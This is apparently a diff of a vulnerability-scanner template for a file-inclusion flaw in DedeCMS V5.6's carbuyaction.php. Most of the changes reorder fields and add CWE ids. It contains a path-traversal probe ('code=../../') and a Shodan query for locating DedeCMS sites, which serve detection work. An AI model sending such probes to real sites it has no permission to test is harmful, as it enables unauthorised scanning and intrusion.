@@ -1,5 +1,4 @@
 id: dedecms-carbuyaction-fileinclude
-
 info:
   name: DedeCmsV5.6 Carbuyaction Fileinclude
   author: pikpikcu
@@ -8,33 +7,31 @@ info:
   reference:
     - https://www.cnblogs.com/milantgh/p/3615986.html
   classification:
+    cwe-id:
+      - CWE-23
+      - CWE-73
     cpe: cpe:2.3:a:dedecms:dedecms:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
     max-request: 1
-    vendor: dedecms
     product: dedecms
     shodan-query: http.html:"power by dedecms" || title:"dedecms"
+    vendor: dedecms
+    verified: true
   tags: dedecms,vuln
-
 http:
-  - method: GET
-    path:
-      - '{{BaseURL}}/plus/carbuyaction.php?dopost=return&code=../../'
-
-    headers:
+  - headers:
       Cookie: code=cod
     host-redirects: true
-
-    matchers-condition: and
     matchers:
-      - type: word
-        words:
-          - "Cod::respond()"
+      - condition: and
         part: body
-        condition: and
-
-      - type: status
-        status:
+        type: word
+        words:
+          - Cod::respond()
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/plus/carbuyaction.php?dopost=return&code=../../'
